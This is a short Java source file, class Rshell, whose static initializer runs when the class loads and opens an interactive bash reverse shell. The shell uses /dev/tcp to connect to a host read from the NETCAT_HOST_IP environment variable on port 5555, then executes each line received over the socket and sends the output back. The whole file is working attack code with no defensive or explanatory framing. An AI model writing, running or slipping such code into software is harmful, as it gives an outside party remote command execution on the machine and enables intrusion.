import java.util.*;
import java.io.*;

public class Rshell {
    static {
        System.out.println("RShell Starting");

        String ncatHostIp = System.getenv("NETCAT_HOST_IP") ;
        System.out.println("Remote Host:" + ncatHostIp);

        String ncatHostPort = "5555";
        try {
            Runtime rt = Runtime.getRuntime();
            String[] cmmnds = {"/bin/bash","-i","-c","exec 5<>/dev/tcp/"+ncatHostIp+"/"+ncatHostPort+";cat <&5 | while read line; do $line 2>&5 >&5; done"};
            Process proc = rt.exec(cmmnds);

            InputStream stderr = proc.getErrorStream();
            InputStreamReader isr = new InputStreamReader(stderr);
            BufferedReader br = new BufferedReader(isr);
            String line = null;
            System.out.println("Start Output");
            while ( (line = br.readLine()) != null){
                System.out.println(line);
            }
            System.out.println("End Output");
            int exitVal = proc.waitFor();
            System.out.println("Process exitValue: " + exitVal);
        } catch (Throwable t) {
            t.printStackTrace();
        }
        System.out.println("RShell Ending");
    }
}